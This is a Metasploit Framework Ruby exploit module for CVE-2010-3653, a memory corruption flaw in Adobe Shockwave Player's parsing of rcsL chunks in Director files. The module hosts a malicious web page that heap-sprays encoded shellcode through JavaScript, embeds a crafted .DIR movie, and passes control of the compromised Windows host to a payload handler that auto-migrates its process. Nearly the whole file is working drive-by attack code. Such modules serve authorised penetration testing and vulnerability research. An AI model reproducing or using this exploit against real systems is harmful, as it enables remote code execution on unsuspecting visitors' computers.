##
# $Id: adobe_shockwave_rcsl_corruption.rb 10784 2010-10-22 12:21:30Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Shockwave rcsL Memory Corruption',
			'Description'    => %q{
					This module exploits a weakness in the Adobe Shockwave player's handling of
				Director movies (.DIR). A memory corruption vulnerability occurs through an undocumented
				rcsL chunk. This vulnerability was discovered by http://www.abysssec.com.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>'],
			'Version'        => '$Revision: 10784 $',
			'References'     =>
				[
					[ 'CVE', '2010-3653'],
					[ 'OSVDB', '68803'],
					[ 'URL', 'https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/15296.zip' ],
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic',     { 'Ret' => 0x0a0a0a0a } ], # tested on XP SP2 and XP SP3
				],
			'DisclosureDate' => 'Oct 21 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	#
	# When exploit is called, load the exploit.dir file
	#
	def exploit

		path = File.join( Msf::Config.install_root, "data", "exploits", "shockwave_rcsl.dir" )
		fd = File.open( path, "rb" )
		@dir_data = fd.read(fd.stat.size)
		fd.close

		super
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		dirname	= rand_text_alpha(rand(20))
		shellcode_rand = rand_text_alpha(rand(20))

		# payload encoding
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# build the exploit
		content = %Q|
<html>
<head>
<title>msf</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script>
#{shellcode_rand} = unescape('#{shellcode}');

nops=unescape('%u0a0a%u0a0a');
headersize =20;
slackspace= headersize + #{shellcode_rand}.length;
while(nops.length< slackspace) nops+= nops;
fillblock= nops.substring(0, slackspace);
block= nops.substring(0, nops.length- slackspace);
while( block.length+ slackspace<0x200000) block= block+ block+ fillblock;
memory=new Array();
for( counter=0; counter<200; counter++) memory[counter]= block + #{shellcode_rand};
</script>
</head>
<body bgColor="#FFFFFF">
<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"
codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"
ID=Abysssec width=600 height=430 VIEWASTEXT>
<param name=src value="#{dirname}.DIR">
<param name=swRemote value="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' ">
<param name=swStretchStyle value=fill>
<param name=PlayerVersion value=11>
<PARAM NAME=bgColor VALUE=#FFFFFF>
<embed src="#{dirname}.DIR" bgColor=#FFFFFF  width=600 height=430 swRemote="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' " swStretchStyle=fill
type="application/x-director" PlayerVersion=11 pluginspage="http://www.macromedia.com/shockwave/download/"></embed>
</object>
</body>
</html>
|

		# Transmit the response to the client
		path = request.uri
		if (path =~ /\.DIR/i)
			print_status("Sending exploit DIR to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, @dir_data, { 'Content-Type' => 'application/octet-stream' })
		else
			print_status("Sending exploit HTML to #{cli.peerhost}:#{cli.peerport}...")
			send_response_html(cli, content)
		end

		# Handle the payload
		handler(cli)

	end

end